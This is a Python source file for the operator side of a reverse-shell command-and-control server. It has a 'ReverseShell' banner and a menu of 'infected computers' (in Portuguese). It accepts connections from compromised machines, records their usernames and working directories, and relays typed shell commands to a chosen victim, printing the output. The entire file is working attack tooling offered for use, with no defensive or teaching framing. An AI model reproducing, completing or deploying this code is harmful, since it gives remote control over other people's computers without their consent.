import os
import socket
from threading import Thread
from colorama import init, Fore, Style
import platform

HOST = '127.0.0.1'
PORT = 8012
SIZE = 1024 * 128
SEP  = '<sep>'

in_menu = True
clients = []
if platform.system() == 'Windows': 
    clear = 'cls'
else: 
    clear = 'clear'
s = socket.socket()

s.bind((HOST, PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
init()

def main():
    while True:
        socket, addr = s.accept()
        Thread(target = new_client(socket, addr)).start()

def new_client(conn, addr):
    clients.append({ 'conn': conn, 'cwd': conn.recv(SIZE).decode('utf-8'), 'addr': addr, 'user': conn.recv(SIZE).decode('utf-8') })
    if in_menu: draw_main()

def connect(socket):
    client = socket['conn']
    cwd = socket['cwd']
    os.system(clear)
    in_menu = False
    while True:
        command = input(f'{cwd} #> ')
        if command.lower() == 'exit':
            break
        elif command.lower() == 'cls':
            os.system(clear)
            continue
        client.send(command.encode())
        output = client.recv(SIZE).decode()
        print(output)
        results, cwd = output.split(SEP)
        print(results)
    in_menu = True

def draw_main():
    os.system(clear)
    print(Fore.CYAN +  '\n   ______                                     ______ _           _ _  \n  (_____ \                                   / _____) |         | | | \n   _____) )_____ _   _ _____  ____ ___ _____( (____ | |__  _____| | | \n  |  __  /| ___ | | | | ___ |/ ___)___) ___ |\____ \|  _ \| ___ | | | \n  | |  \ \| ____|\ V /| ____| |  |___ | ____|_____) ) | | | ____| | | \n  |_|   |_|_____) \_/ |_____)_|  (___/|_____|______/|_| |_|_____)\_)_)\n  ' + Style.RESET_ALL)
    print('  Computadores Infectados :\n')
    for i in range(0, len(clients)):
        try:
            print('        {1} : {0} {2}'.format(clients[i]['user'], i + 1, clients[i]['addr']))
        except:
            False


Thread(target = main).start()

while True:
    draw_main()
    command = input('\n  Connect #> ')
    try:
        connect(clients[int(command) - 1])
    except:
        False
